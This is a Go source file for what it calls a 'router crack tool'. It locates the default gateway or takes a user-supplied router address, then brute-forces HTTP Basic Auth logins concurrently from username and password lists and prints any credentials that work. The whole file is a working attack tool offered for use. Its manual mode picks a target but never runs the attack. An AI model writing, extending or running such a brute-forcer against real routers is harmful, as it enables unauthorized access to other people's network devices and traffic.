package main

import (
	"fmt"
	"github.com/Azunyan1111/azu-ng/GetGateway"
	"github.com/Azunyan1111/azu-ng/password"
	"github.com/Azunyan1111/azu-ng/username"
	"net/http"
	"net/url"
	"os"
	"sync"
)

func main() {
	StartMessage()
	// Auto run asq
	fmt.Print("[?] Do you want to run it auto? (If you know the user name etc n) (y or n):")
	var auto string
	_,err := fmt.Scan(&auto)
	if err != nil{
		panic(err)
	}

	// Auto
	if IsStringY(auto) {
		AutoRun()
		os.Exit(0)
	}else{
		Manual()
		os.Exit(0)
	}
}

func AutoRun(){
	// Get default gateway
	fmt.Println("[+] Select target.")
	fmt.Println("[+] Getting default getaway address")
	addr := GetGateway.GetDefaultGatewayForInterface()
	fmt.Println("[i] Your default gateway is " + addr)
	fmt.Println("[+] HTTP server check")
	if _,err := http.Get("http://" + addr);err != nil{
		fmt.Println("[e] Error. HTTP server not found.")
		return
	}
	fmt.Println("[+] Attack starting...")
	users := username.GetUserName()
	passwords := password.GetPassword()

	wg := sync.WaitGroup{}
	ch := make(chan bool,20)


	for _,user := range users {
		fmt.Println("[+] Current user name:" + user)
		fmt.Print("login")
		for _, pass := range passwords {
			wg.Add(1)
			ch <- true
			go func(addr,user,pass string) {
				defer wg.Done()
				defer func() {<-ch}()
				fmt.Print(".")
				if Login("http://" + addr,user, pass) == http.StatusOK{
					fmt.Println("")
					fmt.Println("[+] Mission complete!!")
					fmt.Println("[+] Username:{" + user + "},pass:{" + pass + "}(Do not include {} )")
					os.Exit(0)
				}
			}(addr,user,pass)
		}
		fmt.Println("")
	}
	wg.Wait()
}

func Login(address string,username string, password string) int {
	req,err := http.NewRequest(http.MethodGet,address,nil)
	req.SetBasicAuth(username,password)
	client := http.Client{}
	resp,err := client.Do(req)
	if err != nil{
		panic(err)
	}
	return resp.StatusCode
}

func Manual(){
	// Login target select
	fmt.Println("[+] Select target.")
	fmt.Print("[?] Would you like to try logging in to the default gateway?(y or Enter router IPAddress or URL):")
	var gate string
	_,err := fmt.Scan(&gate)
	if err != nil{
		panic(err)
	}
	var addr string
	if IsStringY(gate) {
		addr = GetGateway.GetDefaultGatewayForInterface()
	}else{
		// ip address check
		addr = GetGateway.GetDefaultGatewayForIPAddress(gate)
		if addr == ""{
			// url check
			addr = CheckURL(gate)
			if addr == ""{
				fmt.Println("[e] Error! Please enter the correct IP address or URL!")
				return
			}
		}else{
			addr = "http://" + addr
			fmt.Println("[i] Enter your IPAddress is " + addr)
		}
		fmt.Println("[i] Enter your URL is " + addr)
	}
}

func CheckURL(str string)(addr string){
	// Check URL
	u,err := url.Parse(str)
	if err != nil || u.Host == ""{
		return ""
	}
	return str
}

func StartMessage(){
	fmt.Println("------------------------------")
	fmt.Println("[i] This is router crack tool.")
	fmt.Println("------------------------------")
}


func IsStringY(str string)bool{
	if str == "y" || str == "Y" || str == "yes" || str == "Yes" {
		return true
	}else{
		return false
	}
}